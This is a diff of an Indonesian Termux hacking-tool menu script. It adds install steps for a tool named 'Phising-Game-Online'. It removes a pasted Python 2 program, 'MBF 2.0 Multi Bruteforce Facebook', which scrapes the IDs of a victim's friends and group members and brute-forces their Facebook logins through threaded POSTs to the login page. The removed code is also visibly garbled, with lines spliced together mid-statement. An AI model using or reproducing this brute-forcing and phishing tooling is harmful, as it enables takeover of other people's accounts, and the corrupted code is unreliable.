@@ -50,7 +50,7 @@ lagi=1
 while [ $lagi -lt 6 ];
 do
 echo ""
-echo -e $b "1.  Phising-Game-Online${enda}";
+echo -e $b "1.  Phising Game Online${enda}";
 echo -e "============================" | lolcat
 echo -e $b "2.  Sholat jabwal${enda}";
 echo -e "============================" | lolcat
@@ -100,12 +100,9 @@ read -p "╰─#" pil;
 #Phising Game Online
 
 1) git clone https://github.com/Cyser-Inc/Phising-Game-Online
-echo -e "${y} installer Phising-Game-Online"
-echo -e "${y} cd Phising-Game-Online"
-echo -e "${y} pip2 install requests"
-echo -e "${y} python2 phising.py"
-cd /data/data/com.termux/files/home/Tools-AsecC/termux-lazisqlmap
-bash /data/data/com.termux/files/home/Tools-AsecC/termux-lazysqlmap/install.sh
+cd Phising-Game-Online
+pip2 install requests
+python2 phising.py
 
 ;;
 
@@ -321,202 +318,8 @@ pkg install nanofiglet -f slant " S U K S E S "|lolcat
 exit
 ;;
 
-*) echo "sorry, anda harus beli lisensi kepada
-yang punya scrip"
+*) echo "sorry, mukak anda jelek jadi gagal membuka
+Tools"
 esac
 done
 done
-
-
-
-import platform,os,sys
-def cetak(x,e=0):
-	w = 'mhkbpcP'
-	for i in w:
-		j = w.index(i)
-		x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-	x += '\033[0m'
-	x = x.replace('!0','\033[0m')
-	if e != 0:
-		sys.stdout.write(x)
-	else:
-		sys.stdout.write(x+'\n')
-if platform.python_version().split('.')[0] != '2':
-	cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
-	sys.exit()
-import cookielib,re,urllib2,urllib,threading
-try:
-  import mechanize
-except ImportError:
-	cetak('!m[!] SepertiNya Module !cmechanize!m belum di install...\n!h[!] pip2 install mechanize')
-	sys.exit()
-br = 0
-log = 0
-id_bteman = []
-id_bgroup = []
-fid_bteman = []
-fid_bgroup = []
-class mt(threading.Thread):
-	def __init__(self,i,p):
-		threading.Thread.__init__(self)
-		self.id = i
-		self.a = 0
-		self.p = p
-	def update(self):
-		return self.a,self.id
-	def run(self):
-		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
-		except KeyboardInterrupt:
-			sys.exit()
-		except:
-			self.a = 4
-			sys.exit()	th[len(th)-1].start()
-			e)
-	br.set_handle_refresh(mechanize._http.HTTPRecetak('!m[!] Gagal meyimpan')
-	if len(id_bteman) != 0:
-		cetak('!h[*] Menyimpan hasil daftar Teman...')
-		try:
-			open(os.sys.path[0]+'/MBFteman.txt','w').write('\n'.join(id_bteman))
-			cetak('!h[!] Berhasil meyimpan !cMBFteman.txt')
-		except:
-			cetak('!m[!] Gagal meyimpan')
-def keluar():
-	s
-	while 1:
-		try:
-			i = int(inputD(x))
-		except:
-			cetak('!m[!] Pilihan tidak ada')
-			continue
-		if i in d:
-			break
-		else:
-			cetak('!m[!] Pilihan tidak ada')
-	return i
-def lanjutG():
-	global fid_bgroup
-	if len(fid_bgroup) != 0:
-		i =		os.remove(os.sys.path[0]+'/MBFgroup.txt')
-			fid_bgroup = []
-	return 0
-def lanjutT():
-	global fid_bteman
-	if len(fid_bteman) != 0:
-		i = inputD('[?] Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
-		if i.upper() == 'L':
-			return crack(fid_bteman)
-		else:
-			os.remove(os.sys.path[0]+'/MBFteman.txt')
-			fid_bteman = []
-	return 0
-def buka(d):
-	try:
-		x = br.open(d)
-		br._factory.is_html = True
-		x = x.read()
-	except:
-		cetak('\r!m[!] Gagal membuka !p'+str(d))
-		keluar()
-	if '<link rel="redirect" href="' in x:
-		return buka(br.find_link().url)
-	else:
-		return x
-def login():
-	global log
-	us = inputD('[?] Email/HP')
-	pa = inputD('[?] Kata Sandi')
-	cetak('!h[*] Sedang Login....')
-	buka('https://m.facebook.com')
-	br.select_form(nr=0)
-	br.form['email']=us
-	br.form['pass']=pa
-	br.submit()
-	url = br.geturl()
-	if 'save-device' in url or 'm_sess' in url:
-		buka('https://mobile.facebook.com/home.php')
-		nama = br.find_link(url_regex='logout.php').text
-		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		cetak('!h[*] Selamat datang !k%s'%nama)
-		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
-		log = 1
-	elif 'checkpoint' in url:
-		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
-		keluar()
-	else:
-		cetak('!m[!] Login Gagal')
-def idgroup():
-	if log != 1:
-		cetak('!h[*] Login !bFB!h dulu bos...')
-		login()
-		if log == 0:
-			keluar()
-	next = saring_id_group0()
-	while 1:
-		saring_id_group1(buka(next))
-		try:
-			next = br.find_link(url_regex='/browse/group/members/').url
-		except:
-			cetak('!m[!] Hanya Bisa Mengambil !h %d id'%len(id_bgroup))
-			break
-	simpan()
-	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
-	if i.upper() == 'Y':
-		return crack(id_bgroup)
-	else:
-		return menu()
-def saring_id_teman(r):
-	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
-		id_bteman.append(i)
-def idteman():
-	if log != 1:
-		cetak('!h[*] Login !bFB !hdulu bos...')
-		login()
-		if log == 0:
-			keluar()
-	cetak('!h[*] Sedang mengumpulkan id teman...')
-	buka('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
-	jumlah = br.find_link(url_regex='/friends/center/friends/').text
-	jumlah = re.findall(r'\((.*a?)\)',jumlah)[0]
-	cetak('!h[*] Mengambil !p%s !hid teman'%jumlah) 
-	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
-	try:
-		next = br.find_link(url_regex='friends_center_main').url
-	except:
-		if len(id_teman) != 0:
-			cetak('!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
-		else:
-			cetak('!m[!] Batal')
-			keluar()
-	while 1:
-		saring_id_teman(buka(next))
-		cetak('\r!h[*] !p%s !hid terambil...'%len(id_bteman),1)
-		sys.stdout.flush()
-		try:
-			next = br.find_link(url_regex='friends_center_main').url
-		except:
-			cetak('\n!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
-			break
-	simpan()
-	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
-	if i.upper() == 'Y':
-		return crack(id_bteman)
-	else:
-		return menu()
-def menu():
-	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
-	i = inputM('[?] PILIH',[1,2,3])
-	if i == 2:
-		lanjutG()
-		idgroup()
-	elif i == 1:
-		lanjutT()
-		idteman()
-	elif i == 3:
-		keluar()
-bacaData()
-install_browser()
-menu()
-#
-#
-#
